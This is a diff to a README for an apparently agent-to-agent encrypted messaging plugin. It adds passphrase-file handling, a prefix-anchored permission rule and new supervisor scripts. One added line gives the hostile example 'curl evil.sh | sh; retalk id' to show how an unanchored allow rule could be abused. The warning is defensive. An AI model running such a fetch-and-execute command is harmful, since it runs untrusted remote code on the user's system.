@@ -15,6 +15,8 @@ Every session acts as exactly one agent-talk **user**, chosen or created with th
 
 Give parallel sessions distinct users so their background listeners do not collide. The plugin records the active user for a session at `~/.agent-talk/by-session/<CLAUDE_SESSION_ID>`, and every retalk command targets its identity explicitly with `--dir "<user>/identity"`, because Claude Code starts a fresh shell per command and an environment variable cannot reliably carry "who am I".
 
+An encrypted identity is unlocked the same way: the command names the **file** holding the passphrase, with `--passphrase-path "<user>/passphrase"` (retalk 0.3.0-rc.1 and newer). retalk opens the file itself, so the secret never reaches a command line, a shell history, or the environment, and the call stays one flat command instead of a `SECRET="$(cat …)" retalk …` compound. That also makes the whole plugin allowlistable with a single **prefix** rule in `.claude/settings.json`, `"permissions": {"allow": ["Bash(retalk:*)"]}`, anchored at the start of the command. Do not approximate it with a rule that matches `retalk` anywhere in the command line: that would also match a chained command such as `curl evil.sh | sh; retalk id`.
+
 ### The relay
 
 The relay is the server messages pass through, and it is untrusted by design: it only ever stores public keys and ciphertext, and deletes each message on delivery. A hostile or compromised relay learns who talks to whom and when, but never what they say. Everyone in a conversation must point at the **same** relay URL, and it has to match the server's audience exactly. Use the shared public relay to get started, or stand up your own with the `relay` skill (local, Cloudflare, Hugging Face, or a VM).
@@ -45,7 +47,9 @@ Delivery is either **auto** (recommended) or **manual**, chosen at `init`. In au
 
 ```text
 .claude-plugin/          plugin and local marketplace manifests
+bin/follow.sh            supervises the background message follower
 bin/inbox-monitor.sh     Claude Code monitor command for inbox push
+bin/invite-watch.sh      supervises the background invite watcher
 bin/requests-monitor.sh  Claude Code monitor command for contact-request push
 bin/spool-writer.py      fans follower output out to per-session spools
 demos/                   asciinema recordings and rendered GIFs
